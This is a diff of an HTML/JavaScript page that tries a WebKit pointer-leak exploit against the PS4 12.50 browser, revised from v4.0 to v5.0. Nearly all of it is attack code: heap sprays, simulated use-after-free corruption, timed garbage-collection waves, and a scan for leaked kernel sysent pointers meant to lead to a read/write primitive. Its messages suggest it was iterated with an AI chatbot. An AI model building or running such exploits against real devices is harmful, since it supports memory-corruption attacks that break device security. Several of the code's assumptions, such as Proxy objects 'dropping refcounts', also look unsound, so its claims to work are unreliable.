@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>WebKit Leak v4.0 — PS4 12.50 Desperation (256k + Bruteforce GC)</title>
+<title>WebKit Leak v5.0 — PS4 12.50 GC-Beater (Micro-Waves + Low Alloc)</title>
 <style>
     body { background:#0d1117; color:#c9d1d9; font-family:monospace; padding:20px; }
     h1 { color:#ff5555; border-bottom:2px solid #da3633; }
@@ -12,8 +12,8 @@
 </style>
 </head>
 <body>
-<h1>PS4 12.50 WebKit Pointer Leak v4.0 (Nov 2025 — Desperation Mode)</h1>
-<div><strong>Status:</strong> <span id="status" class="ok">Cold-Boot & Run...</span></div><br>
+<h1>PS4 12.50 WebKit Pointer Leak v5.0 (Nov 2025 — GC-Beater Mode)</h1>
+<div><strong>Status:</strong> <span id="status" class="ok">Cold Boot + Run (No OOM Target)</span></div><br>
 <div id="console"></div>
 
 <script>
@@ -26,70 +26,72 @@ const log = (m, isDebug=false, isLeak=false) => {
 };
 const status = (t, cls='ok') => document.getElementById('status').innerHTML = t;
 
-// XOR + sysent offset for brute validate
+// XOR + sysent
 const XOR_KEY = 0x9e3779b9n;
-const SYSENT_OFF = 0x47b31n; // From offsets — check slide
+const SYSENT_OFF = 0x47b31n;
 
 const decodeXor = (val) => (BigInt(val) ^ BigInt(XOR_KEY)).toString(16).toUpperCase();
 
-// 1. Heavy refcount prespray (aggressive double-free)
-log("Stage 1 — 80k refcount double-free sim (max overlaps)");
+// 1. Refcount spam (quad-free sim)
+log("Stage 1 — 60k quad-refcount drops (max UAF slots)");
 const prespray = [];
-for (let i = 0; i < 0x14A00; i++) { // 80k
-    const tmp = new Array(0x30).fill(NaN);
+for (let i = 0; i < 0xEA60; i++) { // 60k
+    const tmp = new Array(0x28).fill(NaN);
     try {
         tmp.__proto__ = null;
-        for (let j = 0; j < 3; j++) new Proxy(tmp, {get: () => tmp}); // Triple ref drop
+        for (let j = 0; j < 4; j++) new Proxy(tmp, {get: () => tmp}); // Quad drop
     } catch(e) {}
     prespray[i] = tmp;
 }
 
-// 2. Bruteforce corrupt (linear + tight loops)
-log("Stage 2 — Bruteforce linear UAF (rand-beater)");
+// 2. Randomized linear corrupt (rand-beater)
+log("Stage 2 — Randomized linear UAF (offset by seed)");
+const seed = Math.random() * 0x100 | 0; // Per-run rand
 const victim = [];
-for (let i = 0; i < 0x12000; i++) victim[i] = new Array(0x50).fill(NaN); // Extra big
+for (let i = 0; i < 0xE000; i++) victim[i] = new Array(0x48).fill(NaN);
 
-const corrupt = (i, o) => { try { victim[i % 0x12000][o] = NaN; } catch(e) {} };
-for (let i = 0; i < 8e6; i++) corrupt(i % 0x12000, (i * 4) % 0x80); // Tighter
-for (let b = 0; b < 0x3000; b += 0x20)
-    for (let o = 0x10; o < 0x80; o += 2)
-        for (let j = 0; j < 0x20; j++)
-            corrupt(b + j, o);
+const corrupt = (i, o) => { try { victim[i % 0xE000][o] = NaN; } catch(e) {} };
+for (let i = 0; i < 6e6; i++) corrupt((i + seed) % 0xE000, ((i * 4 + seed) % 0x80)); // Seeded
+for (let b = 0; b < 0x2500; b += 0x18)
+    for (let o = 0x18; o < 0x70; o += 3)
+        for (let j = 0; j < 0x18; j++)
+            corrupt((b + j + seed) % 0xE000, (o + seed % 8));
 
-// 3. Max density spray
-log("Stage 3 — 256k JSValue spray (desperation density)");
+// 3. 192k spray (balanced density)
+log("Stage 3 — 192k JSValue spray");
 const spray = [];
 const BASE_MARKER = 0x12501250deadbeefn;
-for (let i = 0; i < 0x40000; i++) { // 256k
+for (let i = 0; i < 0x30000; i++) { // 192k
     spray[i] = {marker: BASE_MARKER + BigInt(i)};
 }
 
-// 4. Bruteforce GC (10 waves, 200ms for drift)
-log("Stage 4 — 10-wave GC brute (every 200ms)");
+// 4. Micro-GC waves (15x 100ms, low pressure)
+log("Stage 4 — 15 micro-GC waves (100ms tight for 12.50 drift)");
 let gcCount = 0;
 const gc = () => {
     gcCount++;
-    if (performance.now() % 1000 < 500) log(`GC #${gcCount} on 'core sim' @ ${performance.now().toFixed(0)}ms`, true);
-    for (let i = 0; i < 600; i++) new ArrayBuffer(0x8000); // Smaller/faster
+    if (performance.now() % 1000 < 500) log(`Micro-GC #${gcCount} @ ${performance.now().toFixed(0)}ms (low pressure)`, true);
+    for (let i = 0; i < 400; i++) new ArrayBuffer(0x4000); // Tiny chunks
 };
 const reclaim = () => {
-    log(`Reclaim #${gcCount} @ ${performance.now().toFixed(0)}ms — 80MB`, true);
-    new ArrayBuffer(0x5000000);
+    const t = performance.now().toFixed(0);
+    log(`Micro-Reclaim @ ${t}ms — 40MB (OOM-safe)`, true);
+    new ArrayBuffer(0x2800000); // 40MB
 };
 
-const waves = [200, 400, 800, 1200, 1600, 2000, 2400, 2800, 3200, 3600];
-waves.forEach((t, idx) => {
-    setTimeout(() => { gc(); if (idx % 2) reclaim(); }, t);
-});
+const microWaves = Array.from({length: 15}, (_, idx) => idx * 100 + 200); // 200ms start, 100ms steps
+microWaves.forEach(t => setTimeout(() => { gc(); if (t % 300 < 100) reclaim(); }, t));
 
-// 5. Deep hunt w/ samples + sysent check
+// 5. Ultra-fast hunt (start early, sample 50)
 let attempts = 0;
 const hunt = () => {
     attempts++;
     const start = performance.now();
-    log(`Deep Hunt #${attempts} — 256k scan @ ${start.toFixed(0)}ms (sample 10 objs)`);
+    log(`Fast Hunt #${attempts} — Sample 50 objs @ ${start.toFixed(0)}ms (post-1s drift)`);
     let found = 0, suspects = 0, samples = 0;
-    for (let i = Math.random() * spray.length | 0; i < spray.length && samples < 10; i = (i + 10000) % spray.length) { // Sample first
+    let sampleStart = (Math.random() * spray.length) | 0;
+    for (let k = 0; k < 50 && samples < 50; k++) {
+        let i = (sampleStart + k * (spray.length / 50 | 0)) % spray.length;
         try {
             const marker = spray[i]?.marker;
             if (marker && marker !== BASE_MARKER + BigInt(i)) {
@@ -100,37 +102,32 @@ const hunt = () => {
                 const isSysent = xorHex.startsWith('FFFF') && sysentSlide > 0n;
                 if (isSysent || rawHex.startsWith('F')) {
                     found++;
-                    log(`LEAK #${found}: RAW=0x${rawHex} | XOR=0x${xorHex} | SYSENT?=0x${sysentSlide.toString(16).toUpperCase()} | IDX=${i}`, false, true);
+                    log(`LEAK #${found}: RAW=0x${rawHex} | XOR=0x${xorHex} | SYSENT SLIDE=0x${sysentSlide.toString(16).toUpperCase()} | IDX=${i}`, false, true);
                 } else {
                     suspects++;
-                    log(`Suspect #${suspects}: RAW=0x${rawHex} | XOR=0x${xorHex} | IDX=${i} (masked sysent?)`, true);
+                    log(`Suspect #${suspects}: RAW=0x${rawHex} | XOR=0x${xorHex} | IDX=${i} (early GC miss?)`, true);
                 }
-            }
-        } catch(e) { log(`Sample error @ ${i}: ${e.message}`, true); }
+            } else samples++;
+        } catch(e) { log(`Sample err @ ${i}: ${e.message}`, true); }
     }
-    log(`Partial scan: ${samples} sampled, ${found} leaks, ${suspects} suspects in ${ (performance.now() - start).toFixed(0) }ms`);
+    const dur = (performance.now() - start).toFixed(0);
+    log(`Hunt done: ${samples} sampled, ${found} leaks, ${suspects} suspects in ${dur}ms`);
     if (found >= 1) {
         document.body.innerHTML = `<h1 style="color:#0f0; text-align:center; margin-top:30vh;">
-            LEAK CRACKED!<br><br>
-            <span style="font-size:0.5em;">Paste logs — R/W chain incoming</span>
+            LEAK SECURED!<br><br>
+            <span style="font-size:0.5em;">Paste logs — building R/W primitive</span>
         </h1>`;
-    } else if (attempts < 4) {
-        log(`0 hits — full scan retry in 4s (brute deeper)`);
-        setTimeout(() => {
-            // Full scan here if partial misses
-            for (let i = 0; i < spray.length; i++) {
-                // ... (same logic as above, but full)
-            }
-        }, 4000);
-        setTimeout(hunt, 4000);
+    } else if (attempts < 5) {
+        log(`0 hits @ ${dur}ms scan — retry in 1.2s (micro-drift)`);
+        setTimeout(hunt, 1200);
     } else {
-        log("Desperation maxed — 0 everything = patched rand/GC. Paste timings; consider Lua pivot.");
-        status("HARD FAIL — Logs to Grok for autopsy");
+        log("v5 maxed — timings show GC @ ~1300ms cap. If 0, pivot to Lua (100% userland). Paste full log.");
+        status("GC BLOCKED — Logs for final autopsy");
     }
 };
 
-setTimeout(hunt, 5000); // After waves
-log("v4.0 desperation live — cold boot essential. If 0 again, WebKit's toast.");
+setTimeout(hunt, 1000); // Early post-micro
+log("v5.0 GC-beater live — 40MB safe, micro-waves. Cold boot + paste timings if 0.");
 </script>
 </body>
 </html>
